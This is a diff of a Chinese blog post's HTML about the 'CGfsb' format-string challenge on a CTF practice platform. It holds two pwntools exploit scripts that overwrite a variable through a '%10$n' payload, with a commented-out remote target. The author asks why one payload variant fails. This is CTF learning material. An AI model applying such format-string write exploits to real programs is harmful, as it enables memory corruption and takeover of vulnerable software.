@@ -100,9 +100,9 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>今天又试了试攻防世界CGfsb的脚本，发现了一个问题。</p>
-<h4 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h4><p>```c<br>from pwn import *<br>p=process(‘./CGfsb’)<br>#p=remote(‘111.200.241.244’,52117)<br>pwnme_addr=0x0804A068<br>payload=p32(pwnme_addr)+’aaaa’+’%10$n’<br>p.recvuntil(“please tell me your name:\n”)<br>p.sendline(‘Sakura’)<br>p.recvuntil(“leave your message please:\n”)<br>p.sendline(payload)<br>p.interactive()<br>p.close()</p>
-<p>```c</p>
+        <p>今天又试了试攻防世界CGfsb的脚本，无意中发现了一个问题。</p>
+<h4 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h4><p>```bash<br>from pwn import *<br>p=process(‘./CGfsb’)<br>#p=remote(‘111.200.241.244’,52117)<br>pwnme_addr=0x0804A068<br>payload=p32(pwnme_addr)+’aaaa’+’%10$n’<br>p.recvuntil(“please tell me your name:\n”)<br>p.sendline(‘Sakura’)<br>p.recvuntil(“leave your message please:\n”)<br>p.sendline(payload)<br>p.interactive()<br>p.close()</p>
+<p>```bash</p>
 <h4 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h4><p>```bash<br>from pwn import *<br>p=process(‘./CGfsb’)<br>#p=remote(‘111.200.241.244’,52117)<br>pwnme_addr=0x0804A068<br>payload=p32(pwnme_addr)+p32(0)+’%10$n’<br>p.recvuntil(“please tell me your name:\n”)<br>p.sendline(‘Sakura’)<br>p.recvuntil(“leave your message please:\n”)<br>p.sendline(payload)<br>p.interactive()<br>p.close()</p>
 <p>```bash<br>无意中是把payload中的4个aaaa改成了p32(0)就无法pwn掉了<br>不知道是什么原因无语~~</p>
 
